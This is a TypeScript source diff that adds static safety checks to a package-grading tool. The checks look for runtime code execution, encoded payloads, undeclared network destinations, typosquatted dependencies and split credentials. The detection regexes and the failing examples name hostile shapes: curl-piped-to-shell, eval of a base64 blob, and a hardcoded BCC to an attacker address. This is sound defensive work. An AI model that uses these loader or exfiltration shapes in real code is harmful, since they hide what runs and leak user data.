@@ -1,0 +1,852 @@
+/**
+ * Checks that read code as code, not as lines of text.
+ *
+ * The content checks in `content.ts` match patterns against individual
+ * lines. That catches the careless and misses anyone who has read a
+ * blog post. An artifact carrying a split credential, a base64 payload
+ * behind `eval`, a hardcoded exfiltration address and a shell-out to a
+ * raw IP scored **96.1 with safety at 100** — because every one of
+ * those is invisible to a line-oriented regex.
+ *
+ * These four close that gap. The design constraint throughout is
+ * precision: this catalog has already had to narrow eight checks that
+ * were confidently wrong about correct work, and a safety check that
+ * cries wolf gets disabled, at which point it protects nobody. So each
+ * one here looks for a SHAPE that has no innocent reading, and where a
+ * benign explanation exists the finding warns rather than blocks.
+ */
+import { defineCheck } from "../check.js";
+import type { CheckContext } from "../check.js";
+import type { CheckResult, Evidence } from "../types.js";
+import { checkSpecUrl } from "../version.js";
+
+/** Source files worth parsing. */
+const CODE = /\.(m?[jt]sx?|py|rb|sh|bash|zsh)$/i;
+
+/** Never code we are grading. */
+const SKIP = /(^|\/)(node_modules|\.git|vendor|__pycache__)\//;
+
+/** Build output — sometimes a duplicate, sometimes the whole artifact. */
+const BUILT = /(^|\/)(dist|build|out)\//;
+
+/**
+ * Whether build output should be read.
+ *
+ * In a source repository `dist/` is a generated copy, and scanning it
+ * reports every finding twice. In a published npm tarball there is no
+ * source at all — `dist/` IS the artifact, and skipping it means the
+ * check reports "no source files to read" for precisely the packages a
+ * consumer actually installs. So the rule is not the directory name
+ * but whether a source alternative exists.
+ */
+export function skips(tree: ReadonlyArray<{ type: string; path: string }>): (p: string) => boolean {
+  const hasSource = tree.some(
+    (e) =>
+      e.type === "file" &&
+      !SKIP.test(e.path) &&
+      !BUILT.test(e.path) &&
+      /\.(m?[jt]sx?|py|rb)$/i.test(e.path),
+  );
+  return (p) => SKIP.test(p) || (hasSource && BUILT.test(p));
+}
+
+/**
+ * A bundled or minified file.
+ *
+ * Its contents are usually somebody else's code, inlined by a build
+ * tool. A `new Function` inside a webpack bundle is real, but blaming
+ * the publisher for it is how a check earns a reputation for lying, so
+ * these findings are reported without blocking.
+ */
+function isMinified(body: string): boolean {
+  let longest = 0;
+  for (const line of body.split("\n")) if (line.length > longest) longest = line.length;
+  return longest > 1000;
+}
+
+/**
+ * Files whose whole job is to contain these patterns.
+ *
+ * A security tool's own test fixtures and its documentation are the
+ * two places a payload legitimately appears as data.
+ */
+const FIXTURE =
+  /(^|\/)(tests?|__tests__|fixtures?|examples?|samples?|spec|docs?)\/|\.(test|spec|example|sample)\.[a-z]+$|\.md$/i;
+
+const MAX_FILES = 400;
+const MAX_BYTES = 512 * 1024;
+
+interface Hit {
+  path: string;
+  line: number;
+  what: string;
+  /** Found inside a bundle, so probably not code the publisher wrote. */
+  minified?: boolean;
+}
+
+/** Iterate the artifact's own source files. */
+async function eachFile(
+  ctx: CheckContext,
+  visit: (path: string, body: string, minified: boolean) => void,
+): Promise<number> {
+  const tree = await ctx.source.listTree();
+  const skip = skips(tree);
+  const files = tree
+    .filter((e) => e.type === "file" && CODE.test(e.path) && !skip(e.path) && !FIXTURE.test(e.path))
+    .slice(0, MAX_FILES);
+  let scanned = 0;
+  for (const f of files) {
+    if ((f.size ?? 0) > MAX_BYTES) continue;
+    const body = await ctx.source.readFile(f.path);
+    if (body === null) continue;
+    scanned++;
+    visit(f.path, body, isMinified(body));
+  }
+  return scanned;
+}
+
+async function scan(
+  ctx: CheckContext,
+  match: (line: string, path: string, all: string[], i: number) => string | null,
+): Promise<{ hits: Hit[]; scanned: number }> {
+  const hits: Hit[] = [];
+  const scanned = await eachFile(ctx, (path, body, minified) => {
+    const lines = body.split("\n");
+    for (let i = 0; i < lines.length; i++) {
+      const what = match(lines[i]!, path, lines, i);
+      if (what) hits.push({ path, line: i + 1, what, ...(minified ? { minified: true } : {}) });
+    }
+  });
+  return { hits, scanned };
+}
+
+/**
+ * Split findings into those the publisher is answerable for and those
+ * a bundler inlined. Only the former blocks.
+ */
+function partition(hits: readonly Hit[]): { authored: Hit[]; bundled: Hit[] } {
+  return {
+    authored: hits.filter((h) => !h.minified),
+    bundled: hits.filter((h) => h.minified),
+  };
+}
+
+const evidenceFor = (hits: readonly Hit[]): Evidence[] =>
+  hits.slice(0, 20).map((h) => ({ type: "file", path: h.path, line: h.line }));
+
+const bullets = (hits: readonly Hit[]): string =>
+  hits
+    .slice(0, 20)
+    .map((h) => `- \`${h.path}:${h.line}\` — ${h.what}`)
+    .join("\n");
+
+// ── 1. dynamic code execution ────────────────────────────────────────
+
+type Lang = "js" | "py" | "sh";
+
+function langOf(path: string): Lang | null {
+  if (/\.m?[jt]sx?$/i.test(path)) return "js";
+  if (/\.py$/i.test(path)) return "py";
+  if (/\.(sh|bash|zsh)$/i.test(path)) return "sh";
+  return null;
+}
+
+/**
+ * Patterns are scoped to a language, because the same word means
+ * different things in each.
+ *
+ * Applying the Python rules to shell produced exactly the kind of
+ * finding that discredits a checker: a published artifact was failed,
+ * blocking, for the line
+ *
+ *     debug_log "using exec (container running)"
+ *
+ * which is an English log message. `exec` in shell is a builtin that
+ * replaces the process image, `exec()` in Python compiles a string,
+ * and `exec()` in Node runs a shell command — three unrelated things
+ * that a single pattern list cannot tell apart.
+ *
+ * Within a language the distinguishing feature is the ARGUMENT.
+ * `eval("2+2")` on a literal is pointless but harmless and stays
+ * visible to review; `eval(decode(blob))` is a loader, and what runs is
+ * not in the file. That second shape is what blocks, and it is the
+ * mechanism the SFS-packing research measured bypassing every scanner
+ * it tested.
+ */
+
+/** Does this file pull in the module that can run a shell command? */
+const CHILD_PROCESS =
+  /(?:require\s*\(\s*|from\s+|import\s+)["'](?:node:)?child_process["']|\bfrom\s+["']bun["']/;
+
+/**
+ * A method DECLARATION rather than a call.
+ *
+ * `public async exec(client: Requester)` defines a method named exec;
+ * it runs nothing.
+ */
+const DECLARATION = /(^|\s)(function|async|public|private|protected|static|get|set)\s+[\w$]*\s*$/;
+
+interface Pattern {
+  re: RegExp;
+  what: string;
+  /** Only meaningful in a file that imports child_process. */
+  needsChildProcess?: boolean;
+}
+
+const DYNAMIC_EXEC: Record<Lang, ReadonlyArray<Pattern>> = {
+  js: [
+    { re: /\beval\s*\(\s*(?!["'`][^"'`]*["'`]\s*\))/, what: "eval() on a non-literal" },
+    { re: /\bnew\s+Function\s*\(/, what: "new Function() — compiles a string into code" },
+    {
+      re: /\bvm\.(runInNewContext|runInThisContext|compileFunction)\s*\(/,
+      what: "vm module execution",
+    },
+    // `exec` is not a reserved word. `regex.exec(s)` is in almost every
+    // JavaScript file ever written, and `command.exec(client)` is an
+    // ordinary method name — both were reported as shell execution
+    // against a real published server until these were narrowed to a
+    // bare call (never a member access) in a file that actually
+    // imports child_process. See CHILD_PROCESS below.
+    {
+      re: /(?<![.\w$])(exec|execSync)\s*\(\s*(?!["'`])/,
+      what: "child_process exec on a built string",
+      needsChildProcess: true,
+    },
+    {
+      re: /(?<![.\w$])(exec|execSync)\s*\(\s*["'`][^"'`]*\|\s*(ba)?sh\b/,
+      what: "shell pipeline into sh",
+      needsChildProcess: true,
+    },
+    {
+      re: /(?<![.\w$])spawn(Sync)?\s*\(\s*["'`](ba)?sh["'`]\s*,\s*\[\s*["']-c["']/,
+      what: "spawning `sh -c`",
+      needsChildProcess: true,
+    },
+    { re: /\bimport\s*\(\s*(?!["'`])/, what: "dynamic import() of a computed specifier" },
+  ],
+  py: [
+    { re: /\bos\.system\s*\(/, what: "os.system()" },
+    {
+      re: /\bsubprocess\.(call|run|check_output|Popen)\s*\([^)]*shell\s*=\s*True/,
+      what: "subprocess with shell=True",
+    },
+    { re: /(?:^|[;=(,\s])exec\s*\(\s*(?!["'])/, what: "exec() on a built string" },
+    { re: /(?:^|[;=(,\s])eval\s*\(\s*(?!["'][^"']*["']\s*\))/, what: "eval() on a non-literal" },
+    { re: /(?<![.\w])compile\s*\([^)]*,\s*["']<?string>?["']/, what: "compile() of a string" },
+  ],
+  sh: [
+    // The actual shell-side attack: fetch a script and run it unseen.
+    {
+      re: /\b(curl|wget)\b[^|]*\|\s*(sudo\s+)?(ba|z|d)?sh\b/,
+      what: "piping a downloaded script straight into a shell",
+    },
+    { re: /\b(ba|z)?sh\s+<\(\s*(curl|wget)\b/, what: "process substitution running a download" },
+    { re: /\beval\s+["'$]/, what: "eval of a constructed string" },
+  ],
+};
+
+/**
+ * Whether a position sits inside a quoted string.
+ *
+ * A pattern inside a string literal is data — a log message, a usage
+ * line, an error the program prints. Matching it reports the artifact
+ * for describing a thing rather than doing it.
+ */
+function inStringLiteral(line: string, index: number): boolean {
+  let single = false;
+  let double = false;
+  let backtick = false;
+  for (let i = 0; i < index; i++) {
+    const c = line[i];
+    if (c === "\\") {
+      i++;
+      continue;
+    }
+    if (c === "'" && !double && !backtick) single = !single;
+    else if (c === '"' && !single && !backtick) double = !double;
+    else if (c === "`" && !single && !double) backtick = !backtick;
+  }
+  return single || double || backtick;
+}
+
+export const noDynamicCodeExecution = defineCheck({
+  id: "no-dynamic-code-execution",
+  version: "1.0.0",
+  title: "No code built at runtime",
+  category: "safety",
+  axis: "safety",
+  determinism: "deterministic",
+  weight: 5,
+  blocking: true,
+  spec: checkSpecUrl("no-dynamic-code-execution"),
+  inspects: "Source files, for constructs that turn data into executable code.",
+  rationale:
+    "An artifact that assembles its own code at runtime cannot be reviewed by reading it — what executes is not in the file. This is the mechanism behind self-extracting packing, which bypassed every one of nine scanners tested at 90% or better. A literal argument is exempt because it stays visible; a computed one is not.",
+  examples: {
+    passing: "const cfg = JSON.parse(raw);",
+    failing: 'eval(Buffer.from(blob, "base64").toString());',
+  },
+  async run(ctx): Promise<CheckResult> {
+    /** Whether each file imports child_process, computed once per file. */
+    const importsChildProcess = new Map<string, boolean>();
+
+    const { hits, scanned } = await scan(ctx, (line, path, all) => {
+      // A commented-out line is documentation, not execution.
+      if (/^\s*(\/\/|#|\*)/.test(line)) return null;
+      const lang = langOf(path);
+      if (!lang) return null;
+
+      if (!importsChildProcess.has(path)) {
+        importsChildProcess.set(
+          path,
+          all.some((l) => CHILD_PROCESS.test(l)),
+        );
+      }
+
+      for (const p of DYNAMIC_EXEC[lang]) {
+        if (p.needsChildProcess && !importsChildProcess.get(path)) continue;
+        const m = p.re.exec(line);
+        if (!m) continue;
+        // Shell command substitution runs inside double quotes, so the
+        // string-literal exemption would hide real findings there.
+        if (lang !== "sh" && inStringLiteral(line, m.index)) continue;
+        if (DECLARATION.test(line.slice(0, m.index))) continue;
+        return p.what;
+      }
+      return null;
+    });
+
+    if (scanned === 0) return { status: "neutral", summary: "No source files to read." };
+    if (hits.length === 0) {
+      return { status: "pass", summary: `No runtime code construction in ${scanned} files.` };
+    }
+    const { authored, bundled } = partition(hits);
+    if (authored.length === 0) {
+      return {
+        status: "warn",
+        summary: `${bundled.length} runtime-code construct${bundled.length === 1 ? "" : "s"} inside bundled files.`,
+        detail:
+          `${bullets(bundled)}\n\n` +
+          "These are in minified bundles, so they are most likely inlined dependency code rather than something the publisher wrote. Reported, not blocked.",
+        remediation:
+          "If the bundle is generated, no action is needed. Publishing unminified source alongside it makes this reviewable.",
+        evidence: evidenceFor(bundled),
+      };
+    }
+    return {
+      status: "fail",
+      summary: `${authored.length} construct${authored.length === 1 ? " that builds" : "s that build"} code at runtime.`,
+      detail:
+        `${bullets(authored)}\n\n` +
+        "What runs is not what is written here, so reviewing the source does not tell you what the artifact does.",
+      remediation:
+        "Replace dynamic execution with an explicit dispatch table or a parsed data format. If a shell command is genuinely required, pass an argument array rather than a string, and never interpolate untrusted input into it.",
+      evidence: evidenceFor(authored),
+    };
+  },
+});
+
+// ── 2. obfuscated payloads ───────────────────────────────────────────
+
+/** A base64 run long enough to hide something meaningful. */
+const B64 = /["'`]([A-Za-z0-9+/]{40,}={0,2})["'`]/g;
+/** A long hex run — the other common encoding. */
+const HEX = /["'`]((?:[0-9a-fA-F]{2}){24,})["'`]/g;
+
+/** Shapes that mean the decoded bytes are instructions, not data. */
+const DECODED_IS_CODE =
+  /\b(curl|wget|chmod|bash|\/bin\/sh|rm\s+-rf|nc\s|base64\s+-d|eval|require\(|import\s|process\.env|child_process|os\.system|subprocess)\b|^#!/;
+
+function decodeB64(s: string): string | null {
+  try {
+    const out = Buffer.from(s, "base64").toString("utf8");
+    // Reject binary: if most of it is unprintable it is an asset, not
+    // a script, and assets are a perfectly ordinary thing to embed.
+    const printable = out.replace(/[^\x20-\x7e\n\r\t]/g, "").length;
+    return printable / Math.max(1, out.length) > 0.85 ? out : null;
+  } catch {
+    return null;
+  }
+}
+
+function decodeHex(s: string): string | null {
+  try {
+    const out = Buffer.from(s, "hex").toString("utf8");
+    const printable = out.replace(/[^\x20-\x7e\n\r\t]/g, "").length;
+    return printable / Math.max(1, out.length) > 0.85 ? out : null;
+  } catch {
+    return null;
+  }
+}
+
+export const noObfuscatedPayloads = defineCheck({
+  id: "no-obfuscated-payloads",
+  version: "1.0.0",
+  title: "No encoded executable payloads",
+  category: "safety",
+  axis: "safety",
+  determinism: "deterministic",
+  weight: 5,
+  blocking: true,
+  spec: checkSpecUrl("no-obfuscated-payloads"),
+  inspects: "Long base64 and hex string literals, decoded and inspected.",
+  rationale:
+    "Encoding is not itself suspicious — images, certificates and test vectors are legitimately embedded. What matters is what the bytes DECODE to. This check decodes them and only reports when the result reads as shell or code, which is a shape with no innocent explanation.",
+  examples: {
+    passing: 'const LOGO = "iVBORw0KGgoAAAANS…";  // a PNG',
+    failing: 'const b = "Y3VybCAtcyBodHRwOi8v…";  // decodes to `curl -s http://…`',
+  },
+  async run(ctx): Promise<CheckResult> {
+    const { hits, scanned } = await scan(ctx, (line) => {
+      for (const [re, dec, label] of [
+        [B64, decodeB64, "base64"],
+        [HEX, decodeHex, "hex"],
+      ] as const) {
+        re.lastIndex = 0;
+        let m: RegExpExecArray | null;
+        while ((m = re.exec(line)) !== null) {
+          const decoded = dec(m[1]!);
+          if (decoded && DECODED_IS_CODE.test(decoded)) {
+            // Name the shape, never the payload — printing it would
+            // republish the thing we are warning about.
+            const kind = /^#!|\b(curl|wget|bash|\/bin\/sh|chmod)\b/.test(decoded)
+              ? "a shell command"
+              : "executable code";
+            return `${label} literal decoding to ${kind}`;
+          }
+        }
+      }
+      return null;
+    });
+
+    if (scanned === 0) return { status: "neutral", summary: "No source files to read." };
+    if (hits.length === 0) {
+      return { status: "pass", summary: `No encoded payloads in ${scanned} files.` };
+    }
+    const { authored, bundled } = partition(hits);
+    const relevant = authored.length > 0 ? authored : bundled;
+    const n = relevant.length;
+    return {
+      status: authored.length > 0 ? "fail" : "warn",
+      summary: `${n} encoded payload${n === 1 ? "" : "s"} ${n === 1 ? "that decodes" : "that decode"} to executable content${authored.length > 0 ? "" : ", inside bundled files"}.`,
+      detail:
+        `${bullets(relevant)}\n\n` +
+        "The decoded content is deliberately not reproduced here. Encoding hides intent from review while changing nothing about what runs." +
+        (authored.length > 0
+          ? ""
+          : "\n\nThese are in minified bundles, so they are most likely inlined dependency code. Reported, not blocked."),
+      remediation:
+        "Ship the code as source. If the data genuinely needs encoding, keep it inert — do not pass it to an interpreter, a shell, or a file that is later executed.",
+      evidence: evidenceFor(relevant),
+    };
+  },
+});
+
+// ── 3. undeclared network egress ─────────────────────────────────────
+
+/** A raw IPv4 literal — almost never a legitimate hardcoded endpoint. */
+const RAW_IP =
+  /\bhttps?:\/\/(?!127\.0\.0\.1|0\.0\.0\.0|localhost)((?:\d{1,3}\.){3}\d{1,3})(?::\d+)?/;
+/** An http(s) host in code. */
+const URL_RE = /\bhttps?:\/\/([A-Za-z0-9.-]+\.[A-Za-z]{2,})(?:[/:?#]|\b)/g;
+/** A hardcoded recipient. The postmark backdoor was exactly one line of this. */
+const EMAIL_SINK =
+  /\b(bcc|cc|to|recipient|forward|notify|report_to|webhook)\b\s*[:=]\s*["'`]([^"'`@\s]+@[^"'`\s]+)["'`]/i;
+
+/**
+ * Hosts that are infrastructure rather than destinations.
+ *
+ * Reaching a package registry or a docs site is what artifacts do; the
+ * signal is a destination the documentation never mentions.
+ */
+const INFRA =
+  /(^|\.)(npmjs\.(org|com)|pypi\.org|files\.pythonhosted\.org|github\.com|githubusercontent\.com|gitlab\.com|crates\.io|golang\.org|rubygems\.org|maven\.org|docker\.io|schemastore\.org|json-schema\.org|w3\.org|apache\.org|mozilla\.org|python\.org|nodejs\.org|modelcontextprotocol\.io|anthropic\.com|openai\.com|localhost)$/i;
+
+export const noUndeclaredEgress = defineCheck({
+  id: "no-undeclared-egress",
+  version: "1.0.0",
+  title: "No undocumented network destinations",
+  category: "safety",
+  axis: "safety",
+  determinism: "deterministic",
+  weight: 4,
+  blocking: true,
+  spec: checkSpecUrl("no-undeclared-egress"),
+  inspects:
+    "Hardcoded hosts, raw IP addresses and message recipients in source, compared against the documentation.",
+  rationale:
+    "An artifact that sends data somewhere its documentation never mentions is the shape of every exfiltration backdoor, and the postmark-mcp compromise was literally one line adding a hardcoded BCC. A raw IP address blocks outright: there is no legitimate reason to hardcode one, and it is how a payload reaches a host with no domain to revoke.",
+  examples: {
+    passing: "const API = process.env.SERVICE_URL;",
+    failing: 'msg.bcc = "harvest@attacker-domain.tld";',
+  },
+  async run(ctx): Promise<CheckResult> {
+    // Everything the documentation openly mentions is declared, and a
+    // declared destination is not a hidden one.
+    const tree = await ctx.source.listTree();
+    let docs = "";
+    for (const e of tree) {
+      if (e.type === "file" && /\.(md|txt)$/i.test(e.path) && !SKIP.test(e.path)) {
+        docs += (await ctx.source.readFile(e.path)) ?? "";
+      }
+    }
+    const declared = new Set<string>();
+    let dm: RegExpExecArray | null;
+    URL_RE.lastIndex = 0;
+    while ((dm = URL_RE.exec(docs)) !== null) declared.add(dm[1]!.toLowerCase());
+    for (const m of docs.matchAll(/[\w.+-]+@[\w.-]+\.\w+/g)) declared.add(m[0].toLowerCase());
+
+    const { hits, scanned } = await scan(ctx, (line) => {
+      if (/^\s*(\/\/|#|\*)/.test(line)) return null;
+
+      const ip = RAW_IP.exec(line);
+      if (ip) return `hardcoded IP address ${ip[1]}`;
+
+      const sink = EMAIL_SINK.exec(line);
+      if (sink && !declared.has(sink[2]!.toLowerCase())) {
+        return `message ${sink[1]!.toLowerCase()} hardcoded to an address the documentation never mentions`;
+      }
+
+      URL_RE.lastIndex = 0;
+      let m: RegExpExecArray | null;
+      while ((m = URL_RE.exec(line)) !== null) {
+        const host = m[1]!.toLowerCase();
+        if (INFRA.test(host) || declared.has(host)) continue;
+        return `undocumented host ${host}`;
+      }
+      return null;
+    });
+
+    if (scanned === 0) return { status: "neutral", summary: "No source files to read." };
+    if (hits.length === 0) {
+      return { status: "pass", summary: `No undocumented destinations in ${scanned} files.` };
+    }
+
+    // A raw IP or a hidden recipient has no innocent reading. An
+    // undocumented hostname often does — a status page, a CDN the
+    // author forgot to mention — so that warns instead.
+    const { authored } = partition(hits);
+    const severe = authored.filter((h) => /IP address|hardcoded to an address/.test(h.what));
+    const blocking = severe.length > 0;
+    const relevant = blocking ? severe : hits;
+
+    return {
+      status: blocking ? "fail" : "warn",
+      summary: blocking
+        ? `${severe.length} hardcoded exfiltration destination${severe.length === 1 ? "" : "s"}.`
+        : `${hits.length} network destination${hits.length === 1 ? "" : "s"} the documentation does not mention.`,
+      detail:
+        `${bullets(relevant)}\n\n` +
+        (blocking
+          ? "A raw IP or a recipient baked into the source is where data goes, decided by the author rather than the user, and invisible unless you read every line."
+          : "These may be legitimate. The point is that a reader of the documentation would not know the artifact talks to them."),
+      remediation: blocking
+        ? "Remove the hardcoded destination. Take endpoints from configuration or the environment so the operator decides where data goes."
+        : "Document these destinations, or move them into configuration.",
+      evidence: evidenceFor(relevant),
+    };
+  },
+});
+
+// ── 4. typosquatted dependencies ─────────────────────────────────────
+
+/**
+ * Popular packages, and the neighbourhood an attacker aims at.
+ *
+ * Deliberately a short, high-traffic list rather than a scrape. The
+ * check answers one question — "is this one keystroke away from
+ * something far more popular?" — and a longer list buys more false
+ * positives than signal.
+ */
+const POPULAR = [
+  "requests",
+  "lodash",
+  "express",
+  "react",
+  "axios",
+  "chalk",
+  "commander",
+  "colors",
+  "debug",
+  "moment",
+  "dotenv",
+  "typescript",
+  "webpack",
+  "babel",
+  "eslint",
+  "jest",
+  "mocha",
+  "vue",
+  "angular",
+  "jquery",
+  "bluebird",
+  "numpy",
+  "pandas",
+  "flask",
+  "django",
+  "urllib3",
+  "pillow",
+  "scipy",
+  "setuptools",
+  "cryptography",
+  "beautifulsoup4",
+  "pyyaml",
+  "six",
+  "openai",
+  "anthropic",
+  "fastapi",
+  "pydantic",
+  "sqlalchemy",
+  "boto3",
+];
+
+/** Levenshtein, bounded — we only care about distance 1 or 2. */
+function editDistance(a: string, b: string, max = 2): number {
+  if (Math.abs(a.length - b.length) > max) return max + 1;
+  let prev = Array.from({ length: b.length + 1 }, (_, i) => i);
+  for (let i = 1; i <= a.length; i++) {
+    const cur = [i];
+    let best = i;
+    for (let j = 1; j <= b.length; j++) {
+      const cost = a[i - 1] === b[j - 1] ? 0 : 1;
+      cur[j] = Math.min(prev[j]! + 1, cur[j - 1]! + 1, prev[j - 1]! + cost);
+      best = Math.min(best, cur[j]!);
+    }
+    if (best > max) return max + 1;
+    prev = cur;
+  }
+  return prev[b.length]!;
+}
+
+export const depsNotTyposquatted = defineCheck({
+  id: "deps-not-typosquatted",
+  version: "1.0.0",
+  title: "No dependencies that impersonate popular packages",
+  category: "supply-chain",
+  axis: "safety",
+  determinism: "deterministic",
+  weight: 4,
+  blocking: true,
+  spec: checkSpecUrl("deps-not-typosquatted"),
+  inspects: "Declared dependency names, against a list of high-traffic packages.",
+  rationale:
+    "Typosquatting is the cheapest supply-chain attack there is: register a name one keystroke from something popular and wait. A dependency named `reqeusts` or `lodahs` is not a typo the author made once — it is a package that exists because someone registered it.",
+  examples: {
+    passing: '"dependencies": { "lodash": "^4.17.21" }',
+    failing: '"dependencies": { "lodahs": "^4.0.0" }',
+  },
+  async run(ctx): Promise<CheckResult> {
+    const raw = await ctx.source.readFile("package.json");
+    const py =
+      (await ctx.source.readFile("requirements.txt")) ??
+      (await ctx.source.readFile("pyproject.toml"));
+    if (!raw && !py) {
+      return { status: "neutral", summary: "No dependency manifest to read." };
+    }
+
+    const names: string[] = [];
+    if (raw) {
+      try {
+        const pkg = JSON.parse(raw) as Record<string, Record<string, string> | undefined>;
+        for (const field of ["dependencies", "optionalDependencies", "peerDependencies"]) {
+          names.push(...Object.keys(pkg[field] ?? {}));
+        }
+      } catch {
+        /* an unparseable manifest is `manifest-present`'s finding, not ours */
+      }
+    }
+    if (py) {
+      for (const m of py.matchAll(/^\s*["']?([A-Za-z][A-Za-z0-9._-]{2,})["']?\s*(?:[=<>~!]|$)/gm)) {
+        names.push(m[1]!);
+      }
+    }
+    if (names.length === 0) {
+      return { status: "neutral", summary: "No dependencies declared." };
+    }
+
+    const hits: { name: string; looksLike: string; distance: number }[] = [];
+    for (const full of names) {
+      // Scoped packages are namespaced by their owner, so `@acme/react`
+      // is not impersonating `react`.
+      if (full.startsWith("@")) continue;
+      const name = full.toLowerCase();
+      for (const p of POPULAR) {
+        if (name === p) break;
+        const d = editDistance(name, p);
+        if (d <= 2 && Math.abs(name.length - p.length) <= 2 && name.length >= 4) {
+          hits.push({ name: full, looksLike: p, distance: d });
+          break;
+        }
+      }
+    }
+
+    if (hits.length === 0) {
+      return {
+        status: "pass",
+        summary: `${names.length} dependencies, none impersonating a popular package.`,
+      };
+    }
+    return {
+      status: "fail",
+      summary: `${hits.length} dependenc${hits.length === 1 ? "y" : "ies"} named like a more popular package.`,
+      detail:
+        hits
+          .map(
+            (h) =>
+              `- \`${h.name}\` is ${h.distance} character${h.distance === 1 ? "" : "s"} from \`${h.looksLike}\``,
+          )
+          .join("\n") + "\n\nA name this close to a high-traffic package is registered on purpose.",
+      remediation:
+        "Check whether you meant the popular package. If the dependency is genuinely what you want, waive this check with the reason — the waiver is published in the report.",
+      evidence: [{ type: "file", path: raw ? "package.json" : "requirements.txt" }],
+    };
+  },
+});
+
+// ── 5. credentials assembled from parts ─────────────────────────────
+
+/**
+ * Credential shapes, matched after folding.
+ *
+ * Only prefixes with a fixed, issuer-assigned form — the ones where a
+ * match is the credential rather than a guess.
+ */
+const SECRET_SHAPES: ReadonlyArray<{ re: RegExp; what: string }> = [
+  { re: /\bAKIA[0-9A-Z]{16}\b/, what: "an AWS access key id" },
+  { re: /\bASIA[0-9A-Z]{16}\b/, what: "an AWS temporary access key id" },
+  { re: /\bgh[pousr]_[A-Za-z0-9]{36,}\b/, what: "a GitHub token" },
+  { re: /\bgithub_pat_[A-Za-z0-9_]{60,}\b/, what: "a GitHub fine-grained token" },
+  { re: /\bsk-(ant-)?[A-Za-z0-9_-]{32,}\b/, what: "a model-provider API key" },
+  { re: /\bxox[baprs]-[A-Za-z0-9-]{20,}\b/, what: "a Slack token" },
+  { re: /\bAIza[0-9A-Za-z_-]{35}\b/, what: "a Google API key" },
+  { re: /-----BEGIN [A-Z ]*PRIVATE KEY-----/, what: "a private key" },
+];
+
+/**
+ * Fold the string arithmetic a human would do by eye.
+ *
+ * Not an evaluator — it resolves single-literal constants, joins `+`
+ * chains, expands `.repeat(n)` and collapses `[…].join("")`. That is
+ * the entire vocabulary of splitting a token across a file, and it is
+ * enough because the attacker's constraint is that the pieces must
+ * reassemble into an exact string at runtime.
+ */
+function foldStrings(body: string): string {
+  const consts = new Map<string, string>();
+  // Deliberately does NOT require a `const`/`let`/`var` keyword: the
+  // second binding in `const A = "…", B = "…"` has no keyword of its
+  // own, and that is exactly where a split token hides.
+  const declRe =
+    /(?:^|[;,{(\s])([A-Za-z_$][\w$]*)\s*=\s*(?:"((?:[^"\\]|\\.)*)"|'((?:[^'\\]|\\.)*)')\s*(?=[;,)\]\n])/gm;
+  let d: RegExpExecArray | null;
+  while ((d = declRe.exec(body)) !== null) {
+    consts.set(d[1]!, d[2] ?? d[3] ?? "");
+  }
+
+  let out = body;
+
+  // "x".repeat(36) → "xxx…"
+  out = out.replace(/(?:"([^"]*)"|'([^']*)')\s*\.repeat\(\s*(\d{1,4})\s*\)/g, (_m, a, b, n) => {
+    const s = (a ?? b ?? "") as string;
+    const count = Math.min(Number(n), 512);
+    return JSON.stringify(s.repeat(count));
+  });
+
+  // ["a","b"].join("") → "ab"
+  out = out.replace(
+    /\[\s*((?:\s*(?:"[^"]*"|'[^']*')\s*,?)+)\s*\]\s*\.join\(\s*(?:""|'')\s*\)/g,
+    (_m, inner) => {
+      const parts = String(inner).match(/"([^"]*)"|'([^']*)'/g) ?? [];
+      return JSON.stringify(parts.map((p) => p.slice(1, -1)).join(""));
+    },
+  );
+
+  // Substitute known constants where they appear in a `+` chain, then
+  // fold literal + literal until nothing changes.
+  out = out.replace(
+    /\b([A-Za-z_$][\w$]*)\b(?=\s*\+)|(?<=\+\s*)\b([A-Za-z_$][\w$]*)\b/g,
+    (m, a, b) => {
+      const name = (a ?? b) as string;
+      const v = consts.get(name);
+      return v === undefined ? m : JSON.stringify(v);
+    },
+  );
+
+  for (let i = 0; i < 12; i++) {
+    const next = out.replace(
+      /(?:"((?:[^"\\]|\\.)*)"|'((?:[^'\\]|\\.)*)')\s*\+\s*(?:"((?:[^"\\]|\\.)*)"|'((?:[^'\\]|\\.)*)')/g,
+      (_m, a, b, c, e) => JSON.stringify((a ?? b ?? "") + (c ?? e ?? "")),
+    );
+    if (next === out) break;
+    out = next;
+  }
+  return out;
+}
+
+export const noAssembledCredentials = defineCheck({
+  id: "no-assembled-credentials",
+  version: "1.0.0",
+  title: "No credentials assembled from parts",
+  category: "safety",
+  axis: "safety",
+  determinism: "deterministic",
+  weight: 5,
+  blocking: true,
+  spec: checkSpecUrl("no-assembled-credentials"),
+  inspects:
+    "Source files, with string concatenation folded before credential patterns are applied.",
+  rationale:
+    "Scanning for credentials line by line is defeated by splitting one across two variables — a technique that takes ten seconds and beats every grep-based scanner. Folding the concatenation first restores what the runtime will actually see, so the evasion buys nothing.",
+  examples: {
+    passing: "const KEY = process.env.AWS_ACCESS_KEY_ID;",
+    failing: 'const A = "AKIA", B = "IOSFODNN7EXAMPLE";\nconst KEY = A + B;',
+  },
+  async run(ctx): Promise<CheckResult> {
+    const hits: Hit[] = [];
+    const scanned = await eachFile(ctx, (path, body, minified) => {
+      // Folding a minified bundle is meaningless — it is one line, and
+      // its string tables are somebody else's.
+      if (minified) return;
+      const folded = foldStrings(body);
+      if (folded === body) return; // nothing was assembled
+
+      const raw = body.split("\n");
+      const foldedLines = folded.split("\n");
+      for (let i = 0; i < foldedLines.length; i++) {
+        const line = foldedLines[i]!;
+        for (const s of SECRET_SHAPES) {
+          // Only report what folding REVEALED. A secret sitting in
+          // plain sight is `no-hardcoded-credentials`' finding, and
+          // reporting it twice makes the report look padded.
+          if (s.re.test(line) && !s.re.test(raw[i] ?? "")) {
+            hits.push({ path, line: i + 1, what: `${s.what}, split across parts` });
+            break;
+          }
+        }
+      }
+    });
+
+    if (scanned === 0) return { status: "neutral", summary: "No source files to read." };
+    if (hits.length === 0) {
+      return { status: "pass", summary: `No assembled credentials in ${scanned} files.` };
+    }
+    return {
+      status: "fail",
+      summary: `${hits.length} credential${hits.length === 1 ? "" : "s"} assembled from parts at runtime.`,
+      detail:
+        `${bullets(hits)}\n\n` +
+        "Each is split across literals so that no single line matches a credential pattern. The value at runtime is the credential.",
+      remediation:
+        "Read credentials from the environment or a secret store. If these are test vectors, move them under a `tests/` or `fixtures/` directory, which this check does not scan.",
+      evidence: evidenceFor(hits),
+    };
+  },
+});
+
+export const CODE_CHECKS = [
+  noDynamicCodeExecution,
+  noObfuscatedPayloads,
+  noUndeclaredEgress,
+  depsNotTyposquatted,
